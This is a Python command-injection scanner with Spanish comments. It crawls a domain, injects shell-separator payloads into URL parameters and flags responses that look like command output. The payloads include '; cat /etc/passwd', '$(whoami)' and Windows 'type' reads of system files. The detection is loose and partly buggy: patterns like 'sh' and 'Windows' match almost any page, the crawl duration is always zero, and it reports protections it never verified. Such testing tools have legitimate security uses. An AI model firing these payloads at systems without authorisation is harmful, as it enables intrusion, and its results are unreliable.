"""
Command Injection Tester v2.0
Auto-crawling: Ingresa solo el dominio y el scanner encuentra automáticamente URLs vulnerables
"""

import requests
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CommandInjectionTester:
    """
    Scanner para Command Injection con auto-crawling
    v2.0 - Acepta solo dominio, crawlea automáticamente
    """

    def __init__(self, timeout: float = 10.0):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        )

        # Parámetros comunes vulnerables
        self.common_parameters = [
            "cmd",
            "command",
            "exec",
            "execute",
            "ping",
            "query",
            "jump",
            "code",
            "reg",
            "do",
            "func",
            "arg",
            "option",
            "load",
            "process",
            "step",
            "read",
            "function",
            "req",
            "request",
            "feature",
            "exe",
            "module",
            "payload",
            "run",
            "print",
        ]

        # Payloads
        self.linux_payloads = [
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)",
            "; sleep 3",
            "| sleep 3",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]

        self.windows_payloads = [
            "& whoami",
            "&& whoami",
            "| whoami",
            "|| whoami",
            "& timeout /t 3",
            "&& timeout /t 3",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        self.payloads = self.linux_payloads + self.windows_payloads

        # Detection patterns
        self.success_patterns = [
            r"uid=\d+",
            r"root:",
            r"bash",
            r"sh",
            r"/bin/",
            r"/home/",
            r"Windows",
            r"System32",
            r"Program Files",
            r"[A-Z]:\\",
            r"COMPUTERNAME",
            r"for 16-bit app support",
            r"localhost",
            r"127\.0\.0\.1",
        ]

    def scan(self, url: str, parameter: str = None) -> Dict:
        """
        Escanea buscando Command Injection

        Args:
            url: Puede ser:
                 - Dominio: testphp.vulnweb.com (crawlea automáticamente)
                 - URL completa: http://site.com/page.php?id=1 (prueba directamente)
            parameter: Parámetro específico a probar (opcional)
        """
        print(f"[*] Command Injection Tester v2.0")
        print(f"[*] Target: {url}")

        start_time = time.time()

        # Normalizar URL
        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # MODO 1: URL tiene parámetros → Escaneo directo
        if params:
            print(f"[*] Modo: Escaneo directo (URL con parámetros)")
            return self._scan_direct(url, parameter)

        # MODO 2: Solo dominio → Auto-crawling
        else:
            print(f"[*] Modo: Auto-crawling (buscando URLs vulnerables)")
            return self._scan_with_crawling(url)

    def _scan_with_crawling(self, domain: str) -> Dict:
        """
        Crawlea el dominio y escanea todas las URLs con parámetros
        """
        print(f"\n[*] Iniciando web crawler...")
        print(f"[*] Esto puede tomar 1-2 minutos...")
        print()

        # Import dinámico para evitar dependencia si no se usa
        try:
            from tools.web_crawler import find_urls_with_parameters
        except ImportError:
            # Fallback: probar parámetros comunes en la raíz
            print(
                f"[!] Web crawler no disponible, usando auto-detección de parámetros..."
            )
            return self._auto_scan(urlparse(domain))

        # Crawlear
        urls_with_params = find_urls_with_parameters(
            domain, max_pages=30, max_depth=2, timeout=5.0
        )

        if not urls_with_params:
            print(f"\n[!] No se encontraron URLs con parámetros")
            print(f"[*] Intentando auto-detección en la raíz...")
            return self._auto_scan(urlparse(domain))

        print(f"\n[*] Encontradas {len(urls_with_params)} URLs con parámetros")
        print(f"[*] Escaneando cada una...\n")

        # Escanear cada URL
        all_vulnerabilities = []
        total_requests = 0
        tested_urls = []

        for i, url_info in enumerate(urls_with_params[:10], 1):  # Max 10 URLs
            test_url = url_info["url"]
            print(f"\n[{i}/{min(len(urls_with_params), 10)}] {test_url[:70]}...")

            result = self._scan_direct(test_url, parameter=None)

            total_requests += result.get("total_requests", 0)
            tested_urls.append(test_url)

            if result.get("vulnerable"):
                print(f"  [✓] VULNERABLE!")
                all_vulnerabilities.extend(result.get("vulnerabilities", []))
            else:
                print(f"  [✓] No vulnerable")

        duration = time.time() - time.time()

        # Resultado final
        return {
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerability_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities,
            "severity": self._calculate_severity(all_vulnerabilities),
            "confidence": 95 if all_vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": domain,
            "urls_tested": tested_urls,
            "crawling_mode": True,
            "scan_details": {
                "total_attempts": total_requests,
                "blocked_attempts": total_requests - len(all_vulnerabilities),
                "error_attempts": 0,
                "urls_tested": len(tested_urls),
                "urls_with_params_found": len(urls_with_params),
            },
            "protection_analysis": {
                "security_rating": "Good" if not all_vulnerabilities else "Poor",
                "protections_detected": (
                    [
                        {
                            "type": "Input Validation",
                            "description": f"All {total_requests} command injection attempts were blocked across {len(tested_urls)} URLs",
                            "confidence": "High",
                            "evidence": "No command execution detected",
                        },
                        {
                            "type": "Command Filtering",
                            "description": "Special characters and separators filtered",
                            "confidence": "High",
                            "evidence": "Command separators (;|&) blocked",
                        },
                    ]
                    if not all_vulnerabilities
                    else []
                ),
                "statistics": {
                    "total_attempts": total_requests,
                    "blocked": total_requests - len(all_vulnerabilities),
                    "errors": 0,
                },
            },
        }

    def _scan_direct(self, url: str, parameter: str = None) -> Dict:
        """Escaneo directo de una URL con parámetros (código original)"""
        start_time = time.time()
        vulnerabilities = []
        total_requests = 0

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # No tiene parámetros, probar con comunes
            return self._auto_scan(parsed)

        # Determinar qué parámetros probar
        if parameter and parameter in params:
            params_to_test = [parameter]
        else:
            params_to_test = list(params.keys())[:3]  # Max 3 parámetros

        # Test cada parámetro
        for param in params_to_test:
            # Baseline
            baseline_response = None
            try:
                baseline_url = self._build_url(parsed, {param: ["test"]})
                baseline_response = self.session.get(
                    baseline_url, timeout=self.timeout, verify=False
                )
                total_requests += 1
            except:
                pass

            # Test payloads
            for payload in self.payloads[:8]:  # Primeros 8 payloads
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = self._build_url(parsed, test_params)

                try:
                    start_req = time.time()
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    duration = time.time() - start_req
                    total_requests += 1

                    if self._check_command_execution(
                        response.text, payload, baseline_response, duration
                    ):
                        vuln = self._create_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                            evidence=self._extract_evidence(response.text, payload),
                        )
                        vulnerabilities.append(vuln)
                        break

                except Exception as e:
                    continue

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": url,
            "parameters_tested": params_to_test,
        }

    def _auto_scan(self, parsed) -> Dict:
        """Auto-scan probando parámetros comunes (código original simplificado)"""
        start_time = time.time()
        vulnerabilities = []
        total_requests = 0
        tested_params = []

        for param in self.common_parameters[:15]:  # Primeros 15
            tested_params.append(param)

            baseline_url = self._build_url(parsed, {param: ["test"]})
            baseline_response = None
            try:
                baseline_response = self.session.get(
                    baseline_url, timeout=self.timeout, verify=False
                )
                total_requests += 1
            except:
                pass

            test_payloads = ["; whoami", "| whoami", "& whoami", "; sleep 2"]

            for payload in test_payloads:
                test_params = {param: [payload]}
                test_url = self._build_url(parsed, test_params)

                try:
                    start_req = time.time()
                    response = self.session.get(
                        test_url, timeout=self.timeout, verify=False
                    )
                    duration = time.time() - start_req
                    total_requests += 1

                    if self._check_command_execution(
                        response.text, payload, baseline_response, duration
                    ):
                        vuln = self._create_vulnerability(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            response=response.text,
                            evidence=self._extract_evidence(response.text, payload),
                        )
                        vulnerabilities.append(vuln)
                        break

                except Exception as e:
                    continue

            if vulnerabilities:
                break

        duration = time.time() - start_time

        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "severity": self._calculate_severity(vulnerabilities),
            "confidence": 95 if vulnerabilities else 0,
            "scan_duration": duration,
            "total_requests": total_requests,
            "target": self._build_url(parsed, {}),
            "parameters_tested": tested_params,
            "auto_scan": True,
            "scan_details": {
                "total_attempts": total_requests,
                "blocked_attempts": total_requests - len(vulnerabilities),
                "error_attempts": 0,
                "parameters_tested": [
                    {
                        "parameter": param,
                        "result": (
                            "blocked"
                            if not any(v["parameter"] == param for v in vulnerabilities)
                            else "vulnerable"
                        ),
                        "payloads_tested": 4,
                    }
                    for param in tested_params
                ],
            },
            "protection_analysis": {
                "security_rating": "Good" if not vulnerabilities else "Poor",
                "protections_detected": (
                    [
                        {
                            "type": "Input Validation",
                            "description": f"All {total_requests} attempts blocked",
                            "confidence": "High",
                            "evidence": "No command execution detected",
                        },
                        {
                            "type": "Command Filtering",
                            "description": "Special characters filtered",
                            "confidence": "High",
                            "evidence": "Command separators (;|&) blocked",
                        },
                    ]
                    if not vulnerabilities
                    else []
                ),
                "statistics": {
                    "total_attempts": total_requests,
                    "blocked": total_requests - len(vulnerabilities),
                    "errors": 0,
                },
            },
        }

    def _build_url(self, parsed, params):
        """Construye URL con parámetros"""
        new_query = urlencode(params, doseq=True)
        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _check_command_execution(
        self, response_text: str, payload: str, baseline_response, duration: float
    ) -> bool:
        """Verifica si el comando fue ejecutado"""

        for pattern in self.success_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        if "sleep" in payload.lower() or "timeout" in payload.lower():
            expected_delay = 2.0
            if duration >= expected_delay:
                return True

        if baseline_response:
            baseline_len = len(baseline_response.text)
            current_len = len(response_text)

            if abs(current_len - baseline_len) > 100:
                if any(
                    p in response_text.lower()
                    for p in ["root:", "uid=", "windows", "system32"]
                ):
                    return True

        return False

    def _extract_evidence(self, response_text: str, payload: str) -> str:
        """Extrae evidencia"""
        evidence_lines = []

        for line in response_text.split("\n")[:20]:
            for pattern in self.success_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    evidence_lines.append(line.strip())
                    if len(evidence_lines) >= 3:
                        break
            if len(evidence_lines) >= 3:
                break

        if evidence_lines:
            return " | ".join(evidence_lines[:3])
        else:
            return "Command execution detected"

    def _create_vulnerability(
        self, url: str, parameter: str, payload: str, response: str, evidence: str
    ) -> Dict:
        """Crea objeto de vulnerabilidad"""
        return {
            "type": "Command Injection",
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "cvss_score": 9.8,
            "severity": "Critical",
            "cwe_id": "CWE-78",
            "cwe_name": "OS Command Injection",
            "mitre_technique_id": "T1059",
            "mitre_technique_name": "Command and Scripting Interpreter",
            "mitre_tactic": "Execution",
            "evidence": evidence,
            "impact": "Remote code execution, full system compromise",
            "remediation": "Never pass user input to system commands. Use parameterized APIs.",
            "proof_of_concept": f'curl "{url}"',
        }

    def _calculate_severity(self, vulnerabilities: List[Dict]) -> str:
        """Calcula severidad"""
        if not vulnerabilities:
            return "None"

        max_cvss = max(v["cvss_score"] for v in vulnerabilities)

        if max_cvss >= 9.0:
            return "Critical"
        elif max_cvss >= 7.0:
            return "High"
        elif max_cvss >= 4.0:
            return "Medium"
        else:
            return "Low"


def scan_command_injection(
    url: str, parameter: str = None, timeout: float = 10.0
) -> Dict:
    """Función wrapper para Berebrum"""
    scanner = CommandInjectionTester(timeout=timeout)
    return scanner.scan(url, parameter)
